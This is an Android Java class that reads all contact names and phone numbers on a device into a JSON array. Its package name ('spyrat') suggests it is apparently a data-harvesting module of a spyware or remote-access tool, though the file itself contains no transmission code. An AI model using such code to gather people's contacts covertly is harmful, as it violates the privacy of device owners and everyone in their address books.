package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealContactsCollector {
    private static final String TAG = "RealContactsCollector";
    private Context context;
    
    public RealContactsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getContacts() {
        JSONArray contactsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📇 Collecting REAL contacts from device...");
            
            String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            };
            
            cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    int hasPhoneNumber = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    
                    // Only process contacts with real names
                    if (displayName != null && !displayName.trim().isEmpty()) {
                        JSONObject contact = new JSONObject();
                        contact.put("id", contactId);
                        contact.put("name", displayName.trim());
                        contact.put("phone_numbers", new JSONArray());
                        
                        if (hasPhoneNumber > 0) {
                            JSONArray phoneNumbers = getPhoneNumbers(contactId);
                            contact.put("phone_numbers", phoneNumbers);
                        }
                        
                        contactsList.put(contact);
                        count++;
                        
                        if (count <= 5) {
                            Log.d(TAG, "👤 REAL Contact: " + displayName);
                        }
                    }
                    
                } while (cursor.moveToNext());
                
                Log.d(TAG, "✅ Collected " + count + " REAL contacts from device");
            } else {
                Log.w(TAG, "📭 No REAL contacts found in device");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Contacts permission denied - NO CONTACTS DATA COLLECTED: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL contacts: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return contactsList;
    }
    
    private JSONArray getPhoneNumbers(String contactId) {
        JSONArray phoneNumbers = new JSONArray();
        Cursor phoneCursor = null;
        
        try {
            phoneCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );
            
            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                do {
                    String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
                        phoneNumbers.put(phoneNumber.trim());
                    }
                } while (phoneCursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL phone numbers: " + e.getMessage());
        } finally {
            if (phoneCursor != null) {
                phoneCursor.close();
            }
        }
        
        return phoneNumbers;
    }
}
